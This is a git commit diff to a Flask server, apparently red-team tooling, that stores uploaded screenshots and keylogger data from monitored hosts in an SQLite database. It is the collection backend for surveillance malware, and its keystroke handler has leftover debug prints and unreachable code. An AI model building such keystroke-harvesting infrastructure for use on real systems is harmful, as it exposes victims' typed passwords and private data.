8a88a4fc6988251e950c963e1c8d5f706d5d5fae
Chris <justchris.vantine@gmail.com>
2018-02-18 20:43:57 -0500

    Database backend now functional

--- server/server.py
+++ server/server.py
@@ -3,8 +3,9 @@ A platform for tracking blue team activity
 Author: Chris Vantine
 """
 import os
-import src
+import src.database as database
 from flask import Flask
+from flask import request
 from werkzeug.utils import secure_filename
 from datetime import datetime
 app = Flask(__name__)
@@ -13,6 +14,8 @@ app = Flask(__name__)
 app.config['UPLOAD_FOLDER'] = 'uploads/'
 app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg'}
 
+# spin up new database
+db = database.Database("db.sqlite", "server/src/build_db.sql")
 
 def start_server(ip, port):
     """
@@ -22,6 +25,14 @@ def start_server(ip, port):
     :return: None
     """
     app.run(host=ip, port=port)
+
+
+def allowed_file(filename):
+    """
+    checks if file is allowed
+    """
+    return '.' in filename and \
+           filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']
 
 
 @app.route("/conn")
@@ -53,12 +64,11 @@ def screenshot_handler(host):
             file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
 
             # update database and return success
-            # TODO: UPDATE DATABASE
+            db.add_file(host, filename)
             return "success"
 
         # fail if file type not allowed
         return "invalid"
-
     except:
         return "invalid"
 
@@ -69,6 +79,20 @@ def keylog_handler(host):
     """
     Handler for keylogger data, line by line
     :param host: ip of reporter
-    :return:
+    :return: "invalid" if failed, "success" if successful
     """
-    return "failed"
+    print("1")
+    data = request.data
+    print("2")
+    db.add_keystroke(host, data)
+    print("3")
+    return "success"
+    try:
+        print("1")
+        data = request.data
+        print("2")
+        db.add_keystroke(host, data)
+        print("3")
+        return "success"
+    except:
+        return "failed"
